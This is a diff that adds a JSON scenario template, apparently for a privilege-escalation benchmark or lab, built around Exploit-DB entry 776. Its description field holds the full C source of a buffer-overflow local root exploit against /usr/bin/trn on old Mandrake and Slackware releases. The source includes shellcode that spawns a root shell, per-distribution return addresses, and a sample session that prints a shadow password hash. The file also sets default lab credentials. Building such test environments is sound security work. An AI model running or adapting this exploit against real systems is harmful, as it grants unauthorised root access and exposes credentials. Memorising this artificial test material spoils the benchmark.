@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_776",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Mandrake / Slackware /usr/bin/trn - Local Privilege Escalation (Not SUID)\n\nExploit source code (776.c):\n```\n/*\n/usr/bin/trn local root exploit\nBy ZzagorR - http://www.rootbinbash.com\n*/\n/*\n sh-2.05b$ ./trn\n  usage   : ./trn ret buf\n  example : ./trn 0xbfffff64\n  [+] mandrake   9.2  = 0xbfffff96\n  [+] slackware 10.0.0= 0xbfffff98\n  [+] slackware  9.1.0= 0xbfffff84\n sh-2.05b$\n sh-2.05b$ ./trn 0xbfffff84 128\n  [BOO  %] 128\n  [RET  %] bfffff84\n sh-2.05b#\n sh-2.05b# id\n  uid=0(root) gid=98(nobody) groups=98(nobody)\n sh-2.05b# cat /etc/shadow\n  root:$1$N88/N.aP$dBWcFHiYCXXNb77Y5LPNK1:12705:0:::::\nTEST :\n MANDRAKE 9.2\n SLACKWARE 10.0.0\n SLACKWARE 9.1.0\n http://www.rootbinbash.com/d0kum4n/trn-test.txt\nBOO:\n $trn `perl -e 'print \"A\" x 120'`\n $trn `perl -e 'print \"A\" x 124'`\n $trn `perl -e 'print \"A\" x 128'`\n  Segmentation fault\nBOO=128\n*/\n\n#include <stdio.h>\n#include <string.h>\n#define NEREDE \"/usr/bin/trn\"\n\nchar caylarbeles[] =\n\"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\"\n\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\"\n\"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\"\n\"\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\";\n\nint main(int argc, char *argv[]){\n int bizim;\n char bufe[1000];\n char *tayfasi;\n if (argc < 3) {\n  printf (\"{           trn l0c4l r00t 3xpl01t          }\\n\");\n  printf (\"{  By ZzagorR - http://www.rootbinbash.com  }\\n\");\n  printf (\"{  usage   : %s ret buf                  }\\n\",argv[0]);\n  printf (\"{  example : %s 0xbfffff99 142           }\\n\",argv[0]);\n  printf (\"{  mandrake   9.2   = 0xbfffff96            }\\n\");\n  printf (\"{  slackware 10.0.0 = 0xbfffff98            }\\n\");\n  printf (\"{  slackware  9.1.0 = 0xbfffff84            }\\n\");\n  exit(1);\n }else{\n  unsigned long RET=strtoul(argv[1], NULL, 16);\n  int BOO = atoi(argv[2]);\n   printf (\"[BOO  %] %i\\n\",BOO);\n   printf (\"[RET  %] %x\\n\",RET);\n  tayfasi = bufe;\n  memset(bufe, 0x41,256-strlen(caylarbeles));\n  sprintf(bufe+256-strlen(caylarbeles), \"%s\", caylarbeles);\n  for ( bizim = BOO; bizim <= BOO+4; bizim+= 4 )\n   *(long*)(tayfasi+bizim) = RET;\n  execl(NEREDE, NEREDE , bufe, NULL);\n }\n}\n\n// milw0rm.com [2005-01-26]\n```",
+  "cve": "",
+  "exploitdb_id": "776",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_776",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
